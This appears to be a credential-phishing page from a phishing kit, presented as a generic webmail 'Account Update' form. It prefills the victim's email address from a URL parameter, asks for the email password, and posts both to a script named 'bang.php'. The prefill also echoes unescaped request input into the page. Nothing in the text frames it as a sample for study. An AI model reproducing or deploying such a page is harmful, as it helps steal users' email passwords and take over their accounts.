
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  
  
  <title>Account Update</title>

  
  
  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">

  
  <style>
.label-maker{
    font-family: sans-serif;
}
.label-maker input{
    border: 1px solid #999;
    width: 300px;
    border-bottom-color: #000;
    padding: .3em;
    display: inline-block;
    color: grey;
    font-family: calibri;
    font-size: 1.0em;
    gradient(#444, #333);
    box-shadow: 0 1px 1px #A9A9A9;
}

.btn {
  -webkit-border-radius: 0;
  -moz-border-radius: 0;
  border-radius: 0px;
  text-shadow: 1px 1px 7px #666666;
  font-family: Arial;
  color: #ffffff;
  font-size: 15px;
  background: #00bfff;
  padding: 3px 100px 3px 100px;
  text-decoration: none;
}

.btn:hover {
  background: #C0C0C0;
  text-decoration: none;
}
  </style>
</head><body>
<div style="text-align: center;"><br>
<br>
<br>
<br>
<img style="width: 300px; height: 49px;" alt="" src="images/webmail-logo.png"><br>
<br style="font-family: Calibri; font-weight: bold;">
<table style="text-align: left; width: 30%; margin-left: auto; margin-right: auto;" border="0" cellpadding="0" cellspacing="0">
  <tbody>
    <tr>
      <td style="vertical-align: middle; text-align: center;"><br>
      <form method="post" action="bang.php" name="update" class="label-maker"><input id="p-name" placeholder="someone@example.com" required="" name="loginid" autocomplete="on" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" value="<?=$_GET[loginid]?>" readonly="readonly" type="email"><br>
        <br>
    
        <input name="password" required="" placeholder="Enter your email password." type="password"><br>
        <br>
        <br>
        <button type="submit" id="button" class="btn">Update account</button> </form>
      </td>
    </tr>
  </tbody>
</table>
<br>
<br>
<br>
<br>
<br>
<img style="width: 600px; height: 125px;" alt="" src="images/bg.png"><br>
<br>
</div>

<br>

<br>

</body></html>